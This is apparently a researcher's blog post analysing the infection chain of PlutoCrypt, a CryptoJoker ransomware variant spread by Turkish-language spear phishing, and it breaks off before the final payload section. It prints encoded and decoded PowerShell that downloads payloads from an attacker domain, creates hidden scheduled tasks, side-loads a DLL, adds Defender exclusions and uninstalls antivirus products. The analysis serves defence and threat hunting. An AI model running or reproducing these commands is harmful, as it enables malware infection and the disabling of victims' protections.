---
title: "PlutoCrypt - A CryptoJoker Ransomware Variant"
classes: wide
header:
  teaser: /assets/images/PlutoCrypt-CryptoJoker-Varient/logo.png
  overlay_image: /assets/images/PlutoCrypt-CryptoJoker-Varient/logo.png
  overlay_filter: 0.5
ribbon: DarkSlateBlue
excerpt: "Pivoting through the execution chain of a CryptoJoker Ransomware copycat"
description: "Pivoting through the execution chain of a CryptoJoker Ransomware copycat"
categories:
  - Threat Breakdown
tags:
  - PlutoCrypt
  - CryptoJoker
  - .NET
  - PowerShell
  - Yara
  - Threat Hunting
toc: true
toc_sticky: true
toc_label: "On This Blog"
toc_icon: "biohazard"
---
# Intro
In This blog I will deep dive into a variant of CryptoJoker Ransomware alongside with analyzing the multi stage execution chain. BRACE YOURSELVES!

# The Phish
Our story begins with a spear phishing email, targeting Turkish individuals and organizations. These attacks often begin with an email that appears to be legitimate, but in reality, is designed to manipulate the recipient into divulging sensitive information or downloading malicious software.

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/1.png)

**Translation:**
>Greetings, good day, Aysu from Vakifbank IT service, our iot system is constantly receiving unauthorized verification requests from this "XXX@XXX.XXX" email address, so we needed to contact you. We don't want to start a legal process, can you please **check** the logs here and confirm whether they belong to you. ?

In this particular instance, the attacker has embedded a link in the content of the email, which purports to be from Aysu at Vakifbank IT service. The email claims that the bank's IT system has detected unauthorized verification requests from the recipient's email address and requests confirmation from the victim.

# Execution Chain
Below you can see a diagram that ddemonstrate the execution flow from the moment that the mail was opened:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/2.png)

As you can see the execution chain here is first of all very interesting and secondly contains a lot of steps! I will break down each and every step from the initial payload through the whole files download/execute flow and up until we reach the final payload.

# Initial Payload
## HTA Handle
I will start with the compressed .hta file.<br>
I've opened the file in text editor to see whether the code of the HTA is clear or not and found obfuscated JS code:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/3.png)

Deobfuscating it statically will take years, so instead of it I will convert it to html and save only the script content and open it locally in a browser. <br>
Navigating through the code, the most interesting part was by the end of the script (as I was expecting):

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/4.png)

- **oL2J** - will be an object with the type of `wobj`
- **ficzs** - will contain the data stored in `str4`
- `oL2J` will execute `ficzs`

I've set a breakpoint on the line of `oL2J` declaration and restarted the page, now we can have a look at the Global variables scope and see what both `wobj` and `str4` have inside of them:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/5.png)

`oL2J` will be a `Wscript.Shell` object that will run encoded PowerShell script.

## Embedded PowerShell Execution
Extracted PowerShell Script:
```shell
cmd /C powershell -exec bypass -enc YwBtAGQAIAAvAEMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAGMAIABjAGQAIAAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQA7ACAAYwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAOwAgAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AeAAxAC4AeABtAGwAJwAgAC0AbwB1AHQAZgBpAGwAZQAgACcAeAAuAHgAbQBsACcAOwAgAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AdABhAHMAawAuAHgAbQBsACcAIAAtAG8AdQB0AGYAaQBsAGUAIAAnAHQAYQBzAGsALgB4AG0AbAAnADsAIABpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAtAHUAcgBpACAAJwBoAHQAdABwADoALwAvAGgAbwBzAHQAZABvAG4AZQAuAGQAZABuAHMALgBuAGUAdAAvAHQALgBwAGQAJwAgAC0AbwB1AHQAZgBpAGwAZQAgACcAaQBvAHQAbABvAGcALgBwAGQAZgAnADsAIABzAGMAaAB0AGEAcwBrAHMALgBlAHgAZQAgAC8AQwByAGUAYQB0AGUAIAAvAFgATQBMACAAJwB0AGEAcwBrAC4AeABtAGwAJwAgAC8AdABuACAAJwB0AGEAcwBrAG4AYQBtAGUAJwA7ACAAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgACcAaQBvAHQAbABvAGcALgBwAGQAZgAnADsAIABzAGMAaAB0AGEAcwBrAHMAIAAvAHIAdQBuACAALwB0AG4AIAAnAHQAYQBzAGsAbgBhAG0AZQAnADsA
```

Let's deobfuscate it quickly:


```python
import base64

ENCODED_POWERSHELL = 'YwBtAGQAIAAvAEMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAGMAIABjAGQAIAAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQA7ACAAYwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAOwAgAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AeAAxAC4AeABtAGwAJwAgAC0AbwB1AHQAZgBpAGwAZQAgACcAeAAuAHgAbQBsACcAOwAgAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AdABhAHMAawAuAHgAbQBsACcAIAAtAG8AdQB0AGYAaQBsAGUAIAAnAHQAYQBzAGsALgB4AG0AbAAnADsAIABpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAtAHUAcgBpACAAJwBoAHQAdABwADoALwAvAGgAbwBzAHQAZABvAG4AZQAuAGQAZABuAHMALgBuAGUAdAAvAHQALgBwAGQAJwAgAC0AbwB1AHQAZgBpAGwAZQAgACcAaQBvAHQAbABvAGcALgBwAGQAZgAnADsAIABzAGMAaAB0AGEAcwBrAHMALgBlAHgAZQAgAC8AQwByAGUAYQB0AGUAIAAvAFgATQBMACAAJwB0AGEAcwBrAC4AeABtAGwAJwAgAC8AdABuACAAJwB0AGEAcwBrAG4AYQBtAGUAJwA7ACAAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgACcAaQBvAHQAbABvAGcALgBwAGQAZgAnADsAIABzAGMAaAB0AGEAcwBrAHMAIAAvAHIAdQBuACAALwB0AG4AIAAnAHQAYQBzAGsAbgBhAG0AZQAnADsA'

print(base64.b64decode(ENCODED_POWERSHELL).replace(b'\x00',b'').decode())
```

    cmd /C powershell -exec bypass -c cd $env:appdata; cd $env:appdata; invoke-webrequest -uri 'http://hostdone.ddns.net/x1.xml' -outfile 'x.xml'; invoke-webrequest -uri 'http://hostdone.ddns.net/task.xml' -outfile 'task.xml'; invoke-webrequest -uri 'http://hostdone.ddns.net/t.pd' -outfile 'iotlog.pdf'; schtasks.exe /Create /XML 'task.xml' /tn 'taskname'; start-process 'iotlog.pdf'; schtasks /run /tn 'taskname';


The deobfuscated PowerShell script will download 3 files and save them in the `AppData` folder, it than will execute two of the downloaded files, one by simply starting a process with it (**iotlog.pdf**) which is a junk file with no actual purpose.<br> (`start-process 'iotlog.pdf'`)
The second execution will be by creating a schedule task using one of the downloaded xml files (**task.xml**, `schtasks.exe /Create /XML 'task.xml' /tn 'taskname'`) and then it will execute the task. (`schtasks /run /tn 'taskname'`)
# Tasks Madness
## task.xml
Let's start with the first scheduled task:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-04-03T00:54:30</Date>
    <Author>\pc</Author>
    <Description>rufus.com</Description>
    <URI>\task</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>1910-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c start /min powershell -w hidden -exec bypass -enc TgBlAHcALQBJAHQAZQBtACAAJwBcAFwAPwBcAEMAOgBcAFcAaQBuAGQAbwB3AHMAIABcAFMAeQBzAHQAZQBtADMAMgAnACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQANAAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAtAFAAYQB0AGgAIAAnAFwAXAA/AFwAQwA6AFwAVwBpAG4AZABvAHcAcwAgAFwAUwB5AHMAdABlAG0AMwAyACcADQAKAGMAbwBwAHkAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAdABhAHMAawBtAGcAcgAuAGUAeABlACAAIgBDADoAXAB3AGkAbgBkAG8AdwBzACAAXABTAHkAcwB0AGUAbQAzADIAXAB0AGEAcwBrAG0AZwByAC4AZQB4AGUAIgANAAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAtAFAAYQB0AGgAIAAnAFwAXAA/AFwAQwA6AFwAVwBpAG4AZABvAHcAcwAgAFwAUwB5AHMAdABlAG0AMwAyACcADQAKAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AdQAuAGQAbAAnACAALQBvAHUAdABmAGkAbABlACAAJwB1AHgAdABoAGUAbQBlAC4AZABsAGwAJwANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBwAGEAdABoACAAJwBDADoAXAB3AGkAbgBkAG8AdwBzACAAXABTAHkAcwB0AGUAbQAzADIAXAB0AGEAcwBrAG0AZwByAC4AZQB4AGUAJwA=</Arguments>
    </Exec>
  </Actions>
</Task>
```

Yet another embedded PowerShell script, let's deobfuscate it and see what it lays beneath the obfuscation:


```python
ENCODED_POWERSHELL2 = 'TgBlAHcALQBJAHQAZQBtACAAJwBcAFwAPwBcAEMAOgBcAFcAaQBuAGQAbwB3AHMAIABcAFMAeQBzAHQAZQBtADMAMgAnACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQANAAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAtAFAAYQB0AGgAIAAnAFwAXAA/AFwAQwA6AFwAVwBpAG4AZABvAHcAcwAgAFwAUwB5AHMAdABlAG0AMwAyACcADQAKAGMAbwBwAHkAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAdABhAHMAawBtAGcAcgAuAGUAeABlACAAIgBDADoAXAB3AGkAbgBkAG8AdwBzACAAXABTAHkAcwB0AGUAbQAzADIAXAB0AGEAcwBrAG0AZwByAC4AZQB4AGUAIgANAAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAtAFAAYQB0AGgAIAAnAFwAXAA/AFwAQwA6AFwAVwBpAG4AZABvAHcAcwAgAFwAUwB5AHMAdABlAG0AMwAyACcADQAKAGkAbgB2AG8AawBlAC0AdwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AdQAuAGQAbAAnACAALQBvAHUAdABmAGkAbABlACAAJwB1AHgAdABoAGUAbQBlAC4AZABsAGwAJwANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBwAGEAdABoACAAJwBDADoAXAB3AGkAbgBkAG8AdwBzACAAXABTAHkAcwB0AGUAbQAzADIAXAB0AGEAcwBrAG0AZwByAC4AZQB4AGUAJwA='

print(base64.b64decode(ENCODED_POWERSHELL2).replace(b'\x00',b'').decode())
```

    New-Item '\\?\C:\Windows \System32' -ItemType Directory
    Set-Location -Path '\\?\C:\Windows \System32'
    copy C:\Windows\System32\taskmgr.exe "C:\windows \System32\taskmgr.exe"
    Set-Location -Path '\\?\C:\Windows \System32'
    invoke-webrequest -uri 'http://hostdone.ddns.net/u.dl' -outfile 'uxtheme.dll'
    Start-Process -Filepath 'C:\windows \System32\taskmgr.exe'


The script will do 3 things:
- It will Create a new System32 Folder, it will then copy taskmgr.exe from the original System32 folder to the freshly created System32 folder.<br>
what is special about this that it will duplicate the Windows folder of the user and create an empty System32 Folder, If we run the commands manually we can see that another Windows Folder is created with all the content of the original Windows folder but the System32 folder is empty.

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/6.png)

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/7.png)

- Another payload will be downloaded from the attacker server and will be saved on the impersonated System32 folder by the name `uxtheme.dll`
- The script will execute `taskmgr.exe`
### DLL Side Loading
If we take a look at the imports of `taskmgr.exe` we can find that it loads `uxtheme.dll`:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/8.png)

The TA leverages the [DLL Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) in order to accomplish DLL Side Loading and load the retrieved payload.
I've opened the DLL in IDA and it's pretty straight forward, all Exports will either lead to `SetWindowTheme` or `OpenThemeData` which both will have a similar command that will be executed using `WinExec`:<br>

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/9.png)

**The command:**
```shell
cmd /c cd %appdata% & SCHTASKS /Create /TN \"onedrive\" /XML \"x.xml\" & SCHTASKS /RUN /TN \"onedrive\"
```

The command will create yet another task with the name of **onedrive\\** with the content of **x.xml** which was fetched from the attacker server at alongside with **task.xml** and it will execute the task.

## x.xml
Let's observe the content of the xml file:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2021-05-20T06:39:04</Date>
    <Author></Author>
    <URI>\OneDrive Status Checker Start</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/C "PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABBAHAAcABEAGEAdABhAAoAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUACgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgA=" &amp; PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E "YwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEADQAKAGMAbQBkACAALwBjACAAdwBtAGkAYwAgAC8AbwB1AHQAcAB1AHQAOgAlAGEAcABwAGQAYQB0AGEAJQBcAGwAaQBzAHQAcAByAC4AdAB4AHQAIABwAHIAbwBkAHUAYwB0ACAAZwBlAHQAIABuAGEAbQBlAA0ACgBjAG0AZAAgAC8AYwAgAHQAeQBwAGUAIABsAGkAcwB0AHAAcgAuAHQAeAB0ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAEkAIAAiAG4AYQBtAGUAIABhAHYAYQBzAHQAIABlAHMAZQB0ACAAbgBvAHIAdABvAG4AIABhAG4AdABpAHYAaQByAHUAcwAgAGEAdgBpAHIAYQAgAGsAYQBzAHAAZQByAHMAawB5ACAAbQBjAGEAZgBlAGUAIABwAGEAbgBkAGEAIABtAGEAbAB3AGEAcgBlAGIAeQB0AGUAcwAgAGYALQBTAGUAYwB1AHIAZQAgAHMAeQBtAGEAbgB0AGUAYwAgACIAIAA+ACAAYQBhAHAAcgAuAHQAeAB0AA0ACgAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAGEAYQBwAHIALgB0AHgAdAApAC4AVAByAGkAbQAoACkAIAAtAG4AZQAgACcAJwAgAHwAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAANAAoAJAB4AGEAIAA9ACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAApAFsAMQBdAA0ACgAkAHgAYgAgAD0AIAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAGwAaQBzAHQAZAAuAHQAeAB0ACkAWwAyAF0ADQAKACQAeABjACAAPQAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAbABpAHMAdABkAC4AdAB4AHQAKQBbADMAXQANAAoAJAB4AGQAIAA9ACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAApAFsANABdAA0ACgAkAGEAcABwAGwAYQAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAHMAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAALQBGAGkAbAB0AGUAcgAgACIATgBhAG0AZQAgAD0AIAAnACQAeABhACcAIgANAAoAJABhAHAAcABsAGEALgBVAG4AaQBuAHMAdABhAGwAbAAoACkADQAKACQAYQBwAHAAbABiACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIAAtAEMAbABhAHMAcwAgAFcAaQBuADMAMgBfAFAAcgBvAGQAdQBjAHQAIAAtAEYAaQBsAHQAZQByACAAIgBOAGEAbQBlACAAPQAgACcAJAB4AGIAJwAiAA0ACgAkAGEAcABwAGwAYgAuAFUAbgBpAG4AcwB0AGEAbABsACgAKQANAAoAJABhAHAAcABsAGMAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUAByAG8AZAB1AGMAdAAgAC0ARgBpAGwAdABlAHIAIAAiAE4AYQBtAGUAIAA9ACAAJwAkAHgAYwAnACIADQAKACQAYQBwAHAAbABjAC4AVQBuAGkAbgBzAHQAYQBsAGwAKAApAA0ACgAkAGEAcABwAGwAZAAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAHMAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAALQBGAGkAbAB0AGUAcgAgACIATgBhAG0AZQAgAD0AIAAnACQAeABkACcAIgANAAoAJABhAHAAcABsAGQALgBVAG4AaQBuAHMAdABhAGwAbAAoACkA" &amp; PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E YwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEACgBTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQAvAGgAbwBsAG8ALgB0AHgAdAAgACcAYgBlAG4AaQAgAGIAdQByAGEAZABhACAAYgAxAXIAYQBrACcACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwADoALwAvAGgAbwBzAHQAZABvAG4AZQAuAGQAZABuAHMALgBuAGUAdAAvAHAAbAAuAGUAeABlACcAIAAtAE8AdQB0AEYAaQBsAGUAIABwAGwALgBlAHgAZQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AZQAnACAALQBPAHUAdABGAGkAbABlACAAZQBuAGMALgB4AG0AbAAKAGMAZAAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAAoAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBlAG4AYwAiACAALwBYAE0ATAAgACIAZQBuAGMALgB4AG0AbAAiAAoAYwBtAGQAIAAvAGMAIABzAGMAaAB0AGEAcwBrAHMAIAAgAC8AUgBVAE4AIAAvAFQATgAgACIAZQBuAGMAIgA= &amp; exit"</Arguments>
    </Exec>
  </Actions>
</Task>
```

As we can see this task contains 3 different PowerShell scripts that will be executed. Let's break them one by one:
### AntiVirus/EDR Evasion


```python
ENCODED_POWERSHELL3 = 'QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABBAHAAcABEAGEAdABhAAoAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUACgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgA='

print(base64.b64decode(ENCODED_POWERSHELL3).replace(b'\x00',b'').decode())
```

    Add-MpPreference -ExclusionPath $Env:USERPROFILE\AppData
    Add-MpPreference -ExclusionPath $Env:USERPROFILE
    Add-MpPreference -ExclusionProcess "powershell.exe"


The first script will exclude the User path, the AppData folder and anything that is being run under the process: `powershell.exe` from Windows Defender. <br>
Moving on to the second script:


```python
ENCODED_POWERSHELL4 = 'YwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEADQAKAGMAbQBkACAALwBjACAAdwBtAGkAYwAgAC8AbwB1AHQAcAB1AHQAOgAlAGEAcABwAGQAYQB0AGEAJQBcAGwAaQBzAHQAcAByAC4AdAB4AHQAIABwAHIAbwBkAHUAYwB0ACAAZwBlAHQAIABuAGEAbQBlAA0ACgBjAG0AZAAgAC8AYwAgAHQAeQBwAGUAIABsAGkAcwB0AHAAcgAuAHQAeAB0ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAEkAIAAiAG4AYQBtAGUAIABhAHYAYQBzAHQAIABlAHMAZQB0ACAAbgBvAHIAdABvAG4AIABhAG4AdABpAHYAaQByAHUAcwAgAGEAdgBpAHIAYQAgAGsAYQBzAHAAZQByAHMAawB5ACAAbQBjAGEAZgBlAGUAIABwAGEAbgBkAGEAIABtAGEAbAB3AGEAcgBlAGIAeQB0AGUAcwAgAGYALQBTAGUAYwB1AHIAZQAgAHMAeQBtAGEAbgB0AGUAYwAgACIAIAA+ACAAYQBhAHAAcgAuAHQAeAB0AA0ACgAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAGEAYQBwAHIALgB0AHgAdAApAC4AVAByAGkAbQAoACkAIAAtAG4AZQAgACcAJwAgAHwAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAANAAoAJAB4AGEAIAA9ACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAApAFsAMQBdAA0ACgAkAHgAYgAgAD0AIAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAGwAaQBzAHQAZAAuAHQAeAB0ACkAWwAyAF0ADQAKACQAeABjACAAPQAgACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAbABpAHMAdABkAC4AdAB4AHQAKQBbADMAXQANAAoAJAB4AGQAIAA9ACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABsAGkAcwB0AGQALgB0AHgAdAApAFsANABdAA0ACgAkAGEAcABwAGwAYQAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAHMAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAALQBGAGkAbAB0AGUAcgAgACIATgBhAG0AZQAgAD0AIAAnACQAeABhACcAIgANAAoAJABhAHAAcABsAGEALgBVAG4AaQBuAHMAdABhAGwAbAAoACkADQAKACQAYQBwAHAAbABiACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIAAtAEMAbABhAHMAcwAgAFcAaQBuADMAMgBfAFAAcgBvAGQAdQBjAHQAIAAtAEYAaQBsAHQAZQByACAAIgBOAGEAbQBlACAAPQAgACcAJAB4AGIAJwAiAA0ACgAkAGEAcABwAGwAYgAuAFUAbgBpAG4AcwB0AGEAbABsACgAKQANAAoAJABhAHAAcABsAGMAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUAByAG8AZAB1AGMAdAAgAC0ARgBpAGwAdABlAHIAIAAiAE4AYQBtAGUAIAA9ACAAJwAkAHgAYwAnACIADQAKACQAYQBwAHAAbABjAC4AVQBuAGkAbgBzAHQAYQBsAGwAKAApAA0ACgAkAGEAcABwAGwAZAAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAHMAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAALQBGAGkAbAB0AGUAcgAgACIATgBhAG0AZQAgAD0AIAAnACQAeABkACcAIgANAAoAJABhAHAAcABsAGQALgBVAG4AaQBuAHMAdABhAGwAbAAoACkA'

print(base64.b64decode(ENCODED_POWERSHELL4).replace(b'\x00',b'').decode())
```

    cd $env:APPDATA
    cmd /c wmic /output:%appdata%\listpr.txt product get name
    cmd /c type listpr.txt | findstr /I "name avast eset norton antivirus avira kaspersky mcafee panda malwarebytes f-Secure symantec " > aapr.txt
    (Get-Content aapr.txt).Trim() -ne '' | Set-Content listd.txt
    $xa = (Get-Content listd.txt)[1]
    $xb = (Get-Content listd.txt)[2]
    $xc = (Get-Content listd.txt)[3]
    $xd = (Get-Content listd.txt)[4]
    $appla = Get-WmiObject -Class Win32_Product -Filter "Name = '$xa'"
    $appla.Uninstall()
    $applb = Get-WmiObject -Class Win32_Product -Filter "Name = '$xb'"
    $applb.Uninstall()
    $applc = Get-WmiObject -Class Win32_Product -Filter "Name = '$xc'"
    $applc.Uninstall()
    $appld = Get-WmiObject -Class Win32_Product -Filter "Name = '$xd'"
    $appld.Uninstall()


The second script will have several activitires:
1. Save all installed products names to a `listpr.txt` using the command `wmic`.
2. By using the `findstr`, the script will look for products with AV's names and it will save the results to `aapr.txt`. 
3. The script will rewrite the content of `aapr.txt` to `listd.txt` after a `trim`
4. The script will take only 4 product names (index 1-4)
5. The script will uninstall the applications based on the product names.

The purpose of the script is to remove AV related products to ensure that nothing will flag the rest of the execution flow.<br>
### Final Payload Fetching
let's analyze the last script:


```python
